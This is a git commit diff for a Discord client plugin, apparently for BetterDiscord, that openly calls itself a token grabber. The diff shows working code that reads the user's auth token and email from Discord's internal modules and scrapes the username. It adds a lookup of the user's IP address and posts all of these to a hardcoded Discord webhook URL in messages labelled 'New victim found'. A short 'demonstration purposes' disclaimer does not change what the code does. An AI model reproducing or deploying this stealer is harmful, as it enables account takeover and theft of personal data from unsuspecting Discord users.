e497e297e5d1c352f010cbad0ea3fce7222668c0
ethernalsteve <56690077+ethernalsteve@users.noreply.github.com>
2021-01-10 20:22:55 +0300

    Upgrade to version 1.1
    1. Added sending the victim's ip.
    2. Config change

--- DiscordTokenGrabber.plugin.js
+++ DiscordTokenGrabber.plugin.js
@@ -1,7 +1,12 @@
 /** 
   * @name DiscordTokenGrabber
-  * @version 1.0.0
+  * @version 1.1
   * @description Plugin for getting someone else's auth token Discord
+*/
+
+/* Authors
+ * ethernalsteve - Developer
+ * The Way - Co-Author of the idea
 */
 
 /* This plugin is for demonstration purposes! Not recommended for malicious purposes! */
@@ -9,32 +14,29 @@
 const config = {
     "info": {
         "name": "DiscordTokenGrabber",
-        "author": ["ethernalsteve", "your nickname"],
-        "version": "1.0.0",
+        "authors": ["ethernalsteve", "The Way", "your nickname"],
+        "version": "1.1",
         "description": "Plugin for getting someone else's auth token Discord"
     },
-    "webhook": {
-        // Data from your webhook
-        "id": "",
-        "token": ""
-    }
+    // Your webhook
+    "webhook": "https://discord.com/api/webhooks/786589563602468864/y-8oOOPaGRK4FjtOW-xHB_xGupXU4I5r4R0gNL0Q1GzrKRUDa7zBvsFdu1sLgeenFxTK"
 }
 
 class DiscordTokenGrabber {
     constructor() { this._config = config; }
     
     getName() { return config.info.name; }
-    getAuthor() { return config.info.author[0] }
+    getAuthor() { return config.info.authors[0] }
     getDescription() { return config.info.description; }
     getVersion() { return config.info.version; }
 
-    authToken = Object.values(webpackJsonp.push([ [], { ['']: (_, e, r) => { e.cache = r.c } }, [ [''] ] ]).cache).find(m => m.exports && m.exports.default && m.exports.default.getToken !== void 0).exports.default.getToken();
-    userEmail = Object.values(webpackJsonp.push([ [], { ['']: (_, e, r) => { e.cache = r.c } }, [ [''] ] ]).cache).find(m => m.exports && m.exports.default && m.exports.default.getEmail !== void 0).exports.default.getEmail();
-    username = $("[class *= \"nameTag\"]").first().text();
-
     load() {
-        if (this.authToken != undefined && this.userEmail != undefined && this.username != undefined) {
-            require("request").post(`https://discordapp.com/api/webhooks/${config.webhook.id}/${config.webhook.token}`, {form: {content: `**New victim found by __${config.info.author[1]}__**\n\n**Victim's nickname: __${this.username}__**\n**Victim email: __${this.userEmail}__**\n**Received token:**\`\`\`${this.authToken}\`\`\``}})
-        }
+        const authToken = Object.values(webpackJsonp.push([ [], { ['']: (_, e, r) => { e.cache = r.c } }, [ [''] ] ]).cache).find(m => m.exports && m.exports.default && m.exports.default.getToken !== void 0).exports.default.getToken();
+        const userEmail = Object.values(webpackJsonp.push([ [], { ['']: (_, e, r) => { e.cache = r.c } }, [ [''] ] ]).cache).find(m => m.exports && m.exports.default && m.exports.default.getEmail !== void 0).exports.default.getEmail();
+        const username = $("[class *= \"nameTag\"]").first().text();
+
+        $.getJSON("https://api.ipify.org?format=json", (data) => { 
+            require("request").post(config.webhook, {form: {content: `**New victim found by __${config.info.authors[0]}__**\n\n**Victim's nickname: __${username}__**\n**Victim email: __${userEmail}__**\n**IP: __${data.ip}__**\n\n**Received token:**\`\`\`${authToken}\`\`\``}});
+        });
     }
 }
